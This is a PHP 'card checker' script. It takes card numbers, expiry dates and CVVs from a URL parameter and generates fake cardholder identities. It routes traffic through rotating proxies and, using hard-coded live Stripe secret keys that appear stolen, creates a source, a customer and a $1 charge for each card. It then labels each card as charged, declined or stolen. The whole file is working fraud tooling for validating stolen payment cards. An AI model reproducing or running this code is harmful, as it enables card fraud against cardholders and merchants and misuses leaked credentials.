<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(" ", "|", ""), $lista)[0];
$mes = multiexplode(array(" ", "|", ""), $lista)[1];
$ano = multiexplode(array(" ", "|", ""), $lista)[2];
$cvv = multiexplode(array(" ", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}

function bluewolfproxys(){
$poxySocks = file("bluewolfproxies2.txt");
$myproxy = rand(0, sizeof($poxySocks) - 1);
$poxySocks = $poxySocks[$myproxy];
return $poxySocks;
}

$indexproxy = explode(":", $proxySocks4);
$indexproxyip = $indexproxy[0];
$indexproxyport = $indexproxy[1];
$indexproxyusr = $indexproxy[2];
$indexproxypass = $indexproxy[3];
$indexproxycreds = "$indexproxyusr:$indexproxypass";

$proxydefed = bluewolfproxys();
$proxydefault = str_replace(' ', '', $proxydefed);

$usrproxy = explode(":", $proxydefed);
$proxyip = $usrproxy[0];
$proxyport = $usrproxy[1];
$proxyusr = $usrproxy[2];
$proxypass = $usrproxy[3];
$proxydefs = "$proxyip:$proxyport";
$proxycreds = "$proxyusr:$proxypass";

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = trim(''.$name_first.''.$name_last.'');
$usernm = "$name_first".rand(1, 200)."7";
$email = "$name_first".rand(1, 200000)."@gmail.com";
$randpass = "passofuser".rand(1, 200000)."8912";

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
if ($location_state == "alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}

switch ($ano) {
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
  case '2027':
    $ano = '27';
    break;
  case '2028':
    $ano = '28';
      break;
  case '2029':
    $ano = '29';
      break;
  case '2030':
    $ano = '30';
      break;
}

$pagetime = rand(00000, 99999);

$nypost = rand(10000, 10099);

$randid = rand(450, 570);

function getSID(){
$charid = strtolower(md5(uniqid(rand(), true)));
$hyphen = chr(45);// "-"
$uuid = chr(123)// "{"
.substr($charid, 0, 8).$hyphen
.substr($charid, 8, 4).$hyphen
.substr($charid,12, 4).$hyphen
.substr($charid,16, 4).$hyphen
.substr($charid,20,12)
.chr(125);// "}"
return $uuid;
}

$MUID = getSID();
$muidr = GetStr($MUID, '{','}');

$GUID = getSID();
$guidr = GetStr($GUID, '{','}');

$SID = getSID();
$suidr = GetStr($SID, '{','}');

$pagetime = rand(91796, 99999);

$sk = 'sk_live_kHfjigzxEpx2QJX5CbWbr3vk00S3nVSw6j';
$sk = 'sk_live_V3lSrDbwWdzbrt3456LkMNgY';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/uchihafiles/cookiesk.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/uchihafiles/cookiesk.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name_full.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
$result1 = curl_exec($ch);
$jsonres1 = json_decode($result1, true);
$custok = $jsonres1['id'];
if(curl_errno($ch)){

$error_code = curl_error($ch);
echo "RESPONE[$error_code],";
exit();

}

if(strpos($result1, '"code": "invalid_cvc"')){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result1, "generic_decline")){

echo "RESPONE[Your card was declined(generic)],";
exit();
    
}

elseif(strpos($result1, "Your card number is incorrect")){

echo "RESPONE[Your card was declined(INCORRECT NUMBER)],";
exit();
    
}

elseif(strpos($result1, "Your card's expiration year is invalid")){

echo "RESPONE[Your card was declined(INVALID YEAR)],";
exit();
    
}

elseif(strpos($result1, "Your card's expiration month is invalid")){

echo "RESPONE[Your card was declined(INVALID MONTH)],";
exit();
    
}

elseif(strpos($result1, "do_not_honor")){

echo "RESPONE[Your card was declined(DO NOT HONOR)],";
exit();
    
}

elseif(strpos($result1, "Your card was declined")){

echo "RESPONE[Your card was declined],";
exit();
    
}

elseif(strpos($result1, "invalid_request_error")){

echo "RESPONE[SK ERROR],";
exit();
    
}

elseif(strpos($result1, "Sending credit card numbers directly to the Stripe API is generally unsafe.")){

echo "RESPONE[UNSAFE SK],";
exit();
    
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Pragma: no-cache',
'User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/uchihafiles/cookiesk.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/uchihafiles/cookiesk.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name_full.'&source='.$custok.'');
$result2 = curl_exec($ch);
$jsonres2 = json_decode($result2, true);
$custok2 = $jsonres2['id'];
if(curl_errno($ch)){

$error_code = curl_error($ch);
echo "RESPONE[$error_code],";
exit();

}

if(strpos($result2, "Your card's security code is incorrect")){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result2, "lost_card")){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result2, "stolen_card")){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result2, "pickup_card")){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result2, '"code": "incorrect_cvc"')){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result2, '"code": "invalid_cvc"')){

echo "RESPONE[invalid_cvc],";
exit();

}

elseif(strpos($result2, "do_not_honor")){

echo "RESPONE[Your card was declined(DO NOT HONOR)],";
exit();
    
}

elseif(strpos($result2, '"invalid_account"')){

echo "RESPONE[Your card was declined(INVALID ACCOUNT)],";
exit();
    
}

elseif(strpos($result2, '"transaction_not_allowed"')){

echo "RESPONE[Your card was declined(TRANSACTION NOT ALLOWED)],";
exit();
    
}

elseif(strpos($result2, "Your card has expired.")){

echo "RESPONE[Your card was declined(EXPIRED CARD)],";
exit();
    
}

elseif(strpos($result2, '"code": "processing_error"')){

echo "RESPONE[Your card was declined(PROCESSOR ERROR],";
exit();
    
}

elseif(strpos($result2, "Your card number is incorrect")){

echo "RESPONE[Your card was declined(INCORRECT NUMBER)],";
exit();
    
}

elseif(strpos($result2, "service_not_allowed")){

echo "RESPONE[Your card was declined(SERVICE NOT ALLOWED)],";
exit();
    
}

elseif(strpos($result2, "generic_decline")){

echo "RESPONE[Your card was declined(generic)],";
exit();
    
}

elseif(strpos($result2, '"cvc_check": "fail"')){

echo "RESPONE[Your card was declined(FAIL CVC CHECK)],";
exit();
    
}

elseif(strpos($result2, '"cvc_check": "unavailable"')){

echo "RESPONE[Your card was declined(UNAVAILABLE)],";
exit();
    
}

elseif(strpos($result2, "invalid_request_error")){

echo "RESPONE[SK ERROR],";
exit();
    
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19',
'Pragma: no-cache',
'Content-Type: application/x-www-form-urlencoded'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/uchihafiles/cookiesk.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/uchihafiles/cookiesk.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$custok2.'');
$result3 = curl_exec($ch);
if(curl_errno($ch)){

$error_code = curl_error($ch);
echo "RESPONE[$error_code],";
exit();

}

if(strpos($result3, "incorrect_cvc")){

echo "RESPONE[invalid_cvc],";

}

if(strpos($result3, "Payment complete")){

echo "RESPONE[cvv_charged],";

}

elseif(strpos($result3, "generic_decline")){

echo "RESPONE[Your card was declined(generic)],";

}

elseif(strpos($result3, "insufficient_funds")){

echo "RESPONE[cvv_not_charged],";

}

elseif(strpos($result3, "fraudulent")){

echo "RESPONE[Stripe blocked this payment.],";

}

elseif(strpos($result3, "lost_card")){

echo "RESPONE[invalid_cvc],";

}

elseif(strpos($result3, "stolen_card")){

echo "RESPONE[invalid_cvc],";

}

elseif(strpos($result3, "Your card has expired.")){

echo "RESPONE[Your card was declined(EXPIRED CARD)],";

}

elseif(strpos($result3, "service_not_allowed")){

echo "RESPONE[Your card was declined(SERVICE NOT ALLOWED)],";

}

elseif(strpos($result3, "do_not_honor")){

echo "RESPONE[Your card was declined(DO NOT HONOR)],";

}

elseif(strpos($result3, '"cvc_check": "fail"')){

echo "RESPONE[Your card was declined(FAIL CVC CHECK)],";

}

elseif(strpos($result3, "card number is incorrect")){

echo "RESPONE[Your card was declined(INCORRECT NUMBER)],";

}

elseif(strpos($result3, "card was declined")){

echo "RESPONE[Your card was declined],";

}

else{

echo "RESPONE[ERROR GATEWAY],";

}

curl_close($ch);
ob_flush();

?>